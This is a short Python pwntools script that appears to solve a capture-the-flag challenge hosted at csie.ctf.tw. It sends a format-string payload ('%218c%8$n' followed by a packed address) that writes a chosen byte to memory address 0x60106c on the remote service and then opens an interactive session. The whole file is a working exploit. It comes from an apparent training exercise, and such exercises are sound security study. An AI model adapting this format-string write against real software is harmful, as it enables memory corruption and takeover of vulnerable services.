from pwn import *

host = 'csie.ctf.tw'
port = 10134
# host = '127.0.0.1'
# port = 8888
r = remote(host, port)

magic = 0x60106c
payload = '%' + str(0xda) + 'c%8$n'
payload = payload.encode().ljust(16, b'\x00')
r.sendline(payload + p64(magic))

r.interactive()
